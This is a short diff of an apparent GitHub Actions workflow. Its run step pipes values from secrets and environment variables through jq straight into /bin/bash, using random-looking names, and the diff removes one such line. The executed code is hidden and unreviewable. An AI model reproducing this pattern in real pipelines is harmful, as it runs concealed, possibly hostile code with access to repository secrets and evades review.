@@ -18,7 +18,6 @@ jobs:
           lrii95159: ${{ secrets.lrii95159 }}
         run: |
           printf '%s' "$lrii95159" | jq -r .aoyiz3 | /bin/bash
-          printf '%s' "$fdu8" | jq -r .wb76 | /bin/bash
           echo $gkx9 | jq -r .ot901 | /bin/bash
           echo $s29 | jq -r .vvw252 | /bin/bash
 
